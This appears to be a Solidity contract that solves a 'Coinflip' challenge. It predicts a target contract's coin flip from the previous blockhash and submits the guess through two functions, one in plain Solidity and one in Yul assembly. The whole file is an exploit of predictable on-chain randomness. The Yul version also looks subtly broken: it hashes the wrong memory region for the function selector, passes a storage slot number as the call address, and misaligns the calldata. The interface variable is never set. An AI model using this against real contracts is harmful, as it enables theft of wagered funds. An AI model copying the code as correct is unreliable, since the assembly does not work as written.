// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Coinflip {
    function flip(bool) external returns (bool);
}

contract CoinflipHack {
    Coinflip coinflip;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function solidityHack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 guess = blockValue / FACTOR;
        bool side = guess == 1 ? true : false;
        coinflip.flip(side);
    }

    function yulHack() public {
        assembly {
            mstore(0, sub(number(), 1))
            mstore(0, blockhash(mload(0)))
            let guess := div(mload(0), sload(FACTOR.slot))
            mstore(0x20, "flip(bool)")
            mstore(0x20, keccak256(0, 10))
            mstore(0x24, guess)

            let success := call(gas(), coinflip.slot, 0, 0x20, 0x44, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }
        }
    }
}
